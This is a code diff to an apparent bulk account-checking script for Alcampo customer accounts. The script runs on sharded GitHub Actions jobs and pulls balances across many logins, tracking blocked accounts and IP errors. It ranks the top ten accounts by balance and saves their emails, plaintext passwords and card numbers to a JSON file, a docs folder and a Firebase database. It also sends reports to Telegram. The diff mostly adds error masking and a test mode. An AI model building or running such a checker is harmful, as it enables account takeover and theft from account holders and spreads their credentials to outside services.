@@ -47,17 +47,57 @@ def limpiar_saldo(saldo_str):
     return None
 
 
-def enviar_telegram(token, chat_id, texto, excel_path):
+def _sanitize_telegram_error(err, token=None):
+    msg = type(err).__name__
+    raw = str(err)
+    if token and token in raw:
+        raw = raw.replace(token, "***")
+    raw = re.sub(r"bot\d+:[A-Za-z0-9_-]+", "bot***", raw)
+    return f"{msg}: {raw[:140]}" if raw else msg
+
+
+def enviar_telegram(token, chat_id, texto, excel_path=None):
+    if not token or not chat_id:
+        return False
+    ok = True
     try:
         url_msg = f"https://api.telegram.org/bot{token}/sendMessage"
-        requests.post(url_msg, data={"chat_id": chat_id, "text": texto, "parse_mode": "HTML"}, timeout=15)
-        
-        url_doc = f"https://api.telegram.org/bot{token}/sendDocument"
-        with open(excel_path, "rb") as f:
-            requests.post(url_doc, data={"chat_id": chat_id, "caption": "📊 Reporte Maestro Consolidado de Saldos Alcampo"}, files={"document": f}, timeout=15)
-        print("🎉 Telegram notificado con éxito.")
+        resp_msg = requests.post(
+            url_msg,
+            data={"chat_id": chat_id, "text": texto, "parse_mode": "HTML"},
+            timeout=15
+        )
+        if not resp_msg.ok:
+            print(f"⚠️ Telegram sendMessage devolvió HTTP {resp_msg.status_code}")
+            ok = False
     except Exception as e:
-        print(f"⚠️ Error enviando a Telegram: {e}")
+        print(f"⚠️ Error enviando mensaje a Telegram ({_sanitize_telegram_error(e, token)})")
+        ok = False
+
+    if excel_path:
+        if os.path.exists(excel_path):
+            try:
+                url_doc = f"https://api.telegram.org/bot{token}/sendDocument"
+                with open(excel_path, "rb") as f:
+                    resp_doc = requests.post(
+                        url_doc,
+                        data={"chat_id": chat_id, "caption": "📊 Reporte Maestro Consolidado de Saldos Alcampo"},
+                        files={"document": f},
+                        timeout=15
+                    )
+                if not resp_doc.ok:
+                    print(f"⚠️ Telegram sendDocument devolvió HTTP {resp_doc.status_code}")
+                    ok = False
+            except Exception as e:
+                print(f"⚠️ Error enviando documento a Telegram ({_sanitize_telegram_error(e, token)})")
+                ok = False
+        else:
+            print(f"⚠️ Archivo adjunto no encontrado para Telegram: {os.path.basename(str(excel_path))}")
+            ok = False
+
+    if ok:
+        print("🎉 Telegram notificado con éxito.")
+    return ok
 
 # @end: MergeAndRetry-Helpers
 
@@ -144,17 +184,18 @@ def main():
                 json.dump(failed_accounts, f, ensure_ascii=False, indent=2)
             print(f"💾 Cuentas fallidas guardadas en {args.failed_json}")
             
+            prefix = (os.environ.get("FIREBASE_QUEUE_PREFIX") or "").strip()
             firebase_url = os.environ.get("FIREBASE_DB_URL") or "https://monitor-alcampo-default-rtdb.europe-west1.firebasedatabase.app/"
-            if firebase_url:
+            if firebase_url and os.environ.get("DISABLE_FIREBASE_SYNC") != "1":
                 try:
                     fb_base = firebase_url.strip().rstrip("/")
-                    requests.patch(f"{fb_base}/progress.json", json={
+                    requests.patch(f"{fb_base}/{prefix}progress.json", json={
                         "cycle": 2,
                         "retry_total": len(failed_accounts),
                         "is_finished": False
                     }, timeout=10)
                 except Exception as fe:
-                    print(f"Warning updating retry state in Firebase: {fe}")
+                    print(f"Warning updating retry state in Firebase: {_sanitize_telegram_error(fe)}")
         else:
             if os.path.exists(args.failed_json):
                 os.remove(args.failed_json)
@@ -222,7 +263,7 @@ def main():
             df_all.to_excel(writer, sheet_name="Todas las Cuentas", index=False)
             df_success.to_excel(writer, sheet_name="Exitosas con Saldo", index=False)
             df_callcenter.to_excel(writer, sheet_name="Bloqueadas Call Center", index=False)
-            df_errors.to_excel(writer, sheet_name="Error Credenciales y Autenticacion", index=False)
+            df_errors.to_excel(writer, sheet_name="Errores Credenciales y Red", index=False)
 
         print(f"💾 Reporte consolidado final guardado en {args.output_excel}")
         
@@ -252,8 +293,6 @@ def main():
 
         ranked.sort(key=lambda x: x[0], reverse=True)
         top_10 = ranked[:10]
-        top_10_masked_str = "\n".join([f"   {i+1}. {mask_email(item[1])} ({item[0]:.2f} €)" for i, item in enumerate(top_10)]) if top_10 else "   N/A"
-        top_10_telegram_str = "\n".join([f"   {i+1}. {item[1]} ({item[0]:.2f} €)" for i, item in enumerate(top_10)]) if top_10 else "   N/A"
 
         for val, email, password, card_str in top_10:
             top_10_json.append({
@@ -263,14 +302,11 @@ def main():
                 "card_number": card_str
             })
 
-        with open("top_accounts.json", "w", encoding="utf-8") as tf:
-            json.dump(top_10_json, tf, ensure_ascii=False, indent=2)
+        prefix = (os.environ.get("FIREBASE_QUEUE_PREFIX") or "").strip()
+        test_limit_env = (os.environ.get("TEST_LIMIT") or "").strip()
+        is_test_run = bool(prefix or test_limit_env)
 
         docs_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "docs"))
-        if os.path.exists(docs_dir):
-            with open(os.path.join(docs_dir, "top_accounts.json"), "w", encoding="utf-8") as tf:
-                json.dump(top_10_json, tf, ensure_ascii=False, indent=2)
-
         history_path = os.path.join(docs_dir, "history.json") if os.path.exists(docs_dir) else "history.json"
         history_data = []
         if os.path.exists(history_path):
@@ -282,10 +318,6 @@ def main():
             except Exception:
                 history_data = []
 
-        next_id = 1
-        if history_data:
-            next_id = max([e.get("id", 0) for e in history_data if isinstance(e, dict)] or [0]) + 1
-
         successes = cuentas_dinero + cuentas_cero
         success_rate = (successes / total * 100) if total > 0 else 0.0
         avg_s = float(df_all["total_s"].dropna().mean()) if "total_s" in df_all.columns and not df_all["total_s"].dropna().empty else 13.1
@@ -295,21 +327,39 @@ def main():
 
         now_utc = datetime.now(timezone.utc)
         current_ym = now_utc.strftime("%Y-%m")
-        new_history_entry = {
-            "id": next_id,
-            "date": now_utc.isoformat(),
-            "version": "Multi-VM Matrix 2-Pass v2.1",
-            "duration": round(avg_s * total / max(1, len(files) * 2), 1),
-            "checked": total,
-            "success": successes,
-            "zero": cuentas_cero,
-            "error": cuentas_error,
-            "needs_attention": cuentas_attention,
-            "success_rate": round(success_rate, 2),
-            "total_balance": round(saldo_total, 2),
-            "estimated_actions_minutes": estimated_billed_min
-        }
-        history_data.append(new_history_entry)
+
+        if not is_test_run:
+            with open("top_accounts.json", "w", encoding="utf-8") as tf:
+                json.dump(top_10_json, tf, ensure_ascii=False, indent=2)
+
+            if os.path.exists(docs_dir):
+                with open(os.path.join(docs_dir, "top_accounts.json"), "w", encoding="utf-8") as tf:
+                    json.dump(top_10_json, tf, ensure_ascii=False, indent=2)
+
+            next_id = 1
+            if history_data:
+                next_id = max([e.get("id", 0) for e in history_data if isinstance(e, dict)] or [0]) + 1
+
+            new_history_entry = {
+                "id": next_id,
+                "date": now_utc.isoformat(),
+                "version": "Multi-VM Matrix 2-Pass v2.1",
+                "duration": round(avg_s * total / max(1, len(files) * 2), 1),
+                "checked": total,
+                "success": successes,
+                "zero": cuentas_cero,
+                "error": cuentas_error,
+                "needs_attention": cuentas_attention,
+                "success_rate": round(success_rate, 2),
+                "total_balance": round(saldo_total, 2),
+                "estimated_actions_minutes": estimated_billed_min
+            }
+            history_data.append(new_history_entry)
+
+            with open(history_path, "w", encoding="utf-8") as hf:
+                json.dump(history_data, hf, ensure_ascii=False, indent=4)
+        else:
+            print("🧪 [MODO TEST] Omitiendo actualización de docs/history.json, top_accounts.json y acumulado mensual.")
 
         monthly_accumulated_min = sum(
             int(e.get("estimated_actions_minutes") or math.ceil(float(e.get("duration") or 0) / 60.0 * 7) + 3)
@@ -317,14 +367,17 @@ def main():
             if isinstance(e, dict) and str(e.get("date", "")).startswith(current_ym)
         )
 
-        with open(history_path, "w", encoding="utf-8") as hf:
-            json.dump(history_data, hf, ensure_ascii=False, indent=4)
-
         # Write GitHub Step Summary ($GITHUB_STEP_SUMMARY) without exposing accounts, passwords, or balances
         if "GITHUB_STEP_SUMMARY" in os.environ:
             try:
+                mode_tag = " [MODO TEST]" if is_test_run else ""
+                quota_row = (
+                    f"| **Minutos Acumulados del Mes ({current_ym})** | *Sin cambios en modo test (~{monthly_accumulated_min} / 2.000 min)* |\n"
+                    if is_test_run else
+                    f"| **Minutos Acumulados del Mes ({current_ym})** | **~{monthly_accumulated_min} / 2.000 min ({monthly_accumulated_min / 20.0:.1f}%)** |\n"
+                )
                 summary_md = (
-                    f"## 📊 Resumen Consolidado Alcampo Scraper (v2.1)\n\n"
+                    f"## 📊 Resumen Consolidado Alcampo Scraper (v2.1){mode_tag}\n\n"
                     f"| Métrica | Valor |\n"
                     f"| :--- | :--- |\n"
                     f"| **Cuentas Procesadas** | {total} |\n"
@@ -333,16 +386,15 @@ def main():
                     f"| **Otros Errores (`account_error` / `ip_error`)** | {len(df_errors)} |\n"
                     f"| **Tiempo Medio / p95 por Cuenta** | {avg_s:.2f} s / {p95_s:.2f} s |\n"
                     f"| **Minutos Facturados Estimados (Ejecución)** | ~{estimated_billed_min} min (Jobs: {len(files)} shards + 3 aux) |\n"
-                    f"| **Minutos Acumulados del Mes ({current_ym})** | **~{monthly_accumulated_min} / 2.000 min ({monthly_accumulated_min / 20.0:.1f}%)** |\n"
+                    f"{quota_row}"
                 )
                 with open(os.environ["GITHUB_STEP_SUMMARY"], "a", encoding="utf-8") as sf:
                     sf.write(summary_md)
             except Exception as se:
                 print(f"Warning writing GITHUB_STEP_SUMMARY: {se}")
 
-        prefix = os.environ.get("FIREBASE_QUEUE_PREFIX", "")
         firebase_url = os.environ.get("FIREBASE_DB_URL") or "https://monitor-alcampo-default-rtdb.europe-west1.firebasedatabase.app/"
-        if firebase_url and not prefix:
+        if firebase_url and not is_test_run and os.environ.get("DISABLE_FIREBASE_SYNC") != "1":
             try:
                 fb_base = firebase_url.strip().rstrip("/")
                 requests.put(f"{fb_base}/top_accounts.json", json=top_10_json, timeout=10)
@@ -362,36 +414,50 @@ def main():
                 requests.put(f"{fb_base}/progress.json", json=prog_snap, timeout=10)
                 print("✔ [FIREBASE] Sincronización exitosa de /top_accounts.json, /history.json y /progress.json")
             except Exception as fe:
-                print(f"⚠️ Error al sincronizar con Firebase: {fe}")
+                print(f"⚠️ Error al sincronizar con Firebase: {_sanitize_telegram_error(fe)}")
 
+        mode_label = " [TEST]" if is_test_run else ""
+        quota_line = (
+            f"⚙️ Minutos ejecución test: ~{estimated_billed_min} min (acumulado mensual no modificado)"
+            if is_test_run else
+            f"⚙️ Minutos Actions: ~{estimated_billed_min} min (Mes {current_ym}: ~{monthly_accumulated_min}/2.000 min, {monthly_accumulated_min / 20.0:.1f}%)"
+        )
         msg = (
-            f"📊 <b>RESUMEN EJECUCIÓN ALCAMPO (v2.1)</b>\n\n"
+            f"📊 <b>RESUMEN EJECUCIÓN ALCAMPO (v2.1){mode_label}</b>\n\n"
             f"✅ Procesadas: {total} | OK: {successes} ({success_rate:.1f}%)\n"
             f"⚠️ Atención (`needs_attention`): {cuentas_attention} | Otros errores: {len(df_errors)}\n"
             f"⏱️ Ritmo: {avg_s:.1f}s/cta (p95: {p95_s:.1f}s)\n"
-            f"⚙️ Minutos Actions: ~{estimated_billed_min} min (Mes {current_ym}: ~{monthly_accumulated_min}/2.000 min, {monthly_accumulated_min / 20.0:.1f}%)"
+            f"{quota_line}"
         )
 
         token = os.environ.get("TELEGRAM_TOKEN")
         chat_id = os.environ.get("TELEGRAM_CHAT_ID")
         if token and chat_id:
-            enviar_telegram(token, chat_id, msg)
-            if monthly_accumulated_min >= 1900:
-                quota_alert = (
-                    f"🚨 <b>AVISO DE CUOTA CRÍTICA GITHUB ACTIONS (~100%)</b>\n\n"
-                    f"• Mes: <code>{current_ym}</code>\n"
-                    f"• Consumo acumulado estimado: <b>~{monthly_accumulated_min} / 2.000 min ({monthly_accumulated_min / 20.0:.1f}%)</b>\n"
-                    f"• La ejecución diaria continúa según lo configurado (si GitHub agota la cuota, la cola quedará lista para el siguiente ciclo)."
-                )
-                enviar_telegram(token, chat_id, quota_alert)
-            elif monthly_accumulated_min > 1700:
-                quota_warn = (
-                    f"⚠️ <b>AVISO DE CUOTA GITHUB ACTIONS (&gt;85%)</b>\n\n"
-                    f"• Mes: <code>{current_ym}</code>\n"
-                    f"• Consumo acumulado estimado: <b>~{monthly_accumulated_min} / 2.000 min ({monthly_accumulated_min / 20.0:.1f}%)</b>\n"
-                    f"• La ejecución diaria se mantiene activa."
-                )
-                enviar_telegram(token, chat_id, quota_warn)
+            try:
+                enviar_telegram(token, chat_id, msg)
+            except Exception as e:
+                print(f"⚠️ Error no bloqueante enviando resumen a Telegram ({_sanitize_telegram_error(e, token)})")
+
+            if not is_test_run:
+                try:
+                    if monthly_accumulated_min >= 1900:
+                        quota_alert = (
+                            f"🚨 <b>AVISO DE CUOTA CRÍTICA GITHUB ACTIONS (~100%)</b>\n\n"
+                            f"• Mes: <code>{current_ym}</code>\n"
+                            f"• Consumo acumulado estimado: <b>~{monthly_accumulated_min} / 2.000 min ({monthly_accumulated_min / 20.0:.1f}%)</b>\n"
+                            f"• La ejecución diaria continúa según lo configurado (si GitHub agota la cuota, la cola quedará lista para el siguiente ciclo)."
+                        )
+                        enviar_telegram(token, chat_id, quota_alert)
+                    elif monthly_accumulated_min > 1700:
+                        quota_warn = (
+                            f"⚠️ <b>AVISO DE CUOTA GITHUB ACTIONS (&gt;85%)</b>\n\n"
+                            f"• Mes: <code>{current_ym}</code>\n"
+                            f"• Consumo acumulado estimado: <b>~{monthly_accumulated_min} / 2.000 min ({monthly_accumulated_min / 20.0:.1f}%)</b>\n"
+                            f"• La ejecución diaria se mantiene activa."
+                        )
+                        enviar_telegram(token, chat_id, quota_warn)
+                except Exception as e:
+                    print(f"⚠️ Error no bloqueante enviando aviso de cuota a Telegram ({_sanitize_telegram_error(e, token)})")
 
 # @end: MergeAndRetry-Main
 
